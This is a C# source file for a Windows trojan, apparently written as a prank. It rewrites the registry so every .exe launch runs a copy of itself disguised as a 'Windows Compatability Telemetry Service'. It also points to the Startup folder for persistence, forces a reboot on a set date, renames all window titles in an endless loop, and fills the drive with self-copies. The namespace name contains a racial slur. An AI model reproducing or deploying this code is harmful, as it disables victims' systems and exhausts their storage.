// Copyright 2017 tiraboschi
using System;                           // Rout; Imports
using Microsoft.Win32;                  // Rout; Imports
using System.Runtime.InteropServices;   // Rout; Imports
using System.Windows.Forms;             // Rout; Imports
using System.Threading;                 // Rout; Imports
using System.IO;                        // Rout; Imports
using System.Diagnostics;               // Rout; Imports
using System.Security.Principal;        // Rout; Imports

namespace MyNigga {
//
    class FamSquad {
//
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)] // To change window titles
        public static extern bool SetWindowText(IntPtr hwnd, String lpString); // To change window titles
//
        static void Main() { // Main
//
// Definitions
//
            String Day = DateTime.Now.Day.ToString();
            String Month = DateTime.Now.Month.ToString();
            String DayMonth = Day + ":" + Month;
            bool i = true; // For loops
            Random rnd = new Random(); // For file name gen
            var number0 = rnd.Next(); // A random number
            var fn = System.Reflection.Assembly.GetEntryAssembly().Location; // Get running location
            var location = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"; // Auto-start location
            var filename = "Windows Compatability Telemetry Service b." + number0 + ".exe"; // Random file name
            var copyto = location + filename; // Combine them
//
// Set as default program to run .exes
//
            try{
            RegistryKey startwithkey = Registry.ClassesRoot.OpenSubKey("exefile\\shell\\open\\command", true);
            startwithkey.SetValue("", copyto, RegistryValueKind.String);
            startwithkey.Close();
            RegistryKey kee = Registry.ClassesRoot.OpenSubKey("exe\\shell\\open\\command", true);
            kee.SetValue("kee", copyto, RegistryValueKind.String);
            kee.Close();
            } catch{}
//
// Error message + restart if date is right
//
            if(DayMonth == "01:10"){
            MessageBox.Show("Kagou-anti-Kro$oft says not today!",
                    "Happy Birthday Dan!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            System.Diagnostics.Process.Start("shutdown.exe", "-r -t 0");}
//
// Payloads (infinite loop starts here)
//
            while(i) {
                Process[] processlist = Process.GetProcesses();
                foreach (Process processitem in processlist) {
// Set window titles
                    SetWindowText(processitem.MainWindowHandle, "TrOjAn.WiN32.ShItS-HoSeD 1.03, I mAke ThIs vIrUs BeCaUsE I dOn'T hAvE NoThInG tO dO!!");}
// Fill drive with files
                    int number = rnd.Next();
                    System.IO.File.Copy(fn, "C:\\Temp\\Oh Hey Thanks " + number + ".exe");
            //Process.GetCurrentProcess().Kill();
            }
            //
            // END
            //
        }
    }
}

// cant forget:

// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
// TODO: REMOVE EVERYTHING FROM THE CONTEXT MENU
